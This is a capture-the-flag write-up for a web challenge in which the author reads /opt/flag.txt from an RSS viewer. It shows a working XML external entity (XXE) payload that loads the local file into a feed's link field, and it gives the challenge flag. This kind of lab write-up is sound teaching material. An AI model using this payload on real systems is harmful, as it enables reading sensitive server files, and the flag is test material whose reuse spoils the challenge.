Category: Web

Points: 50
### Description
A friend of Rafiki... RSS is the magic Word. The flag is located at /opt/flag.txt

---
### Solution
To read the `flag.txt`, we need to perform a XXE attack on the RSS file viewer.
I used an AI generated sample to do the test :

```xml
<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
  <channel>
    <title>Mini feed</title>
    <link>http://example.com/</link>
    <description>Short test RSS</description>
    <item>
      <title>Test item</title>
      <link>http://example.com/test</link>
      <description>Just a tiny sample.</description>
      <pubDate>Sun, 09 Nov 2025 12:00:00 +0000</pubDate>
    </item>
  </channel>
</rss>
```

![](attachments/Pasted%20image%2020251109201654.png)

The page only returns the link from the sample, so I decided to inject an external entity named `xxe` that references `/opt/flag.txt` into the `<link>` tag.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rss [
  <!ENTITY xxe SYSTEM "file:///opt/flag.txt">
]>
<rss version="2.0">
  <channel>
    <title>Mini feed</title>
    <link>http://example.com/</link>
    <description>Short test RSS</description>
    <item>
      <title>Test item</title>
      <link>&xxe;</link>
      <description>Just a tiny sample.</description>
      <pubDate>Sun, 09 Nov 2025 12:00:00 +0000</pubDate>
    </item>
  </channel>
</rss>
```

![](attachments/Pasted%20image%2020251109202202.png)

Flag: `SADC{37bc4fdcc67bbaf22320b410d4ad0cb4}`

GG!